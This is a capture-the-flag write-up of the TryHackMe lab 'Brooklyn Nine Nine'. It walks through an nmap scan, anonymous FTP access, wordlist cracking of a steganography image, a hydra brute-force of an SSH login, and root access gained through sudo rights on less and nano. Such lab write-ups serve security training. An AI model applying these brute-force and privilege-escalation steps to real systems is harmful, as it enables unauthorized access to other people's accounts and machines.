# [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name |Brooklyn Nine Nine |
| Difficulty | Easy |
| Tags | security, nmap, gobuster, pentetst|

---

IP=`10.10.75.6`

Nmap Scan: 
```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.1.58
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports:
```
21 ftp
22 ssh
80 http
880 ?
10616 ?
```
There are lots of juicy information about it, an `Apache web-server(80)`, `Anonymous FTP` and `SSH`.

Let’s go through each ports one by one.

```PORT 80 - WEBSERVER```

Greeted with a B99 banner! Noice!
Looking at the source code, we find out the image name and download the image using wget http://IP/brooklyn99.jpg. There are abundance of hints, like Have you ever heard of steganography?

So we shall, use stegcracker to get the hidden data from the image,
```
$ stegcracker brooklyn99.jpg ~/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/home/cardinal/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt'..
Successfully cracked file with password: admin
Tried 1588 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```

And we have set of credentials, that looks like could be used by SSH,
```
$ cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

```PORT 21 - Anonymous FTP```
Using the Anonymous FTP credentails, `anonymous` as username and password! We get a `note_to_jake.txt` from FTP server. And it contains a sweet text from Amy,

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
```PORT 22 - SSH```
Let’s try and get into SSH using the credentials `holt` as username and `fluffydog12@ninenine` as password!

We got two files in the default directory and one of them is `user.txt` and `nano.save` but it can be accessed by root, hence we have the user’s flag! Let’s enumerate more, so getting the `/etc/passwd` gives us that we have two more potential account: `jake` & `amy`.

Let’s try and get into jake’s account using bruteforce, for bruteforce we could use `hydra`.

```
$ hydra -l jake -P ~/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://IP
[22][ssh] host: IP   login: jake   password: 987654321
```
And we have jake’s password!!!! Let’s meet jake then!!!!
After getting into jake’s machine and we see it’s sudo privileges by `sudo -l` and we can see that jake has sudo privileges for `less`, and using it we can access the `root.txt` from root user.

```
$ less root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: xxxxxxxxxxxxxxxxxxxxxxxxxx

Enjoy!!
```
And we have pwned the box!!!

### Other Method
```
hen we do, `sudo -l` in holt’s account, we find out that we have sudo privileges for nano. And we could escalate using nano as well.
```
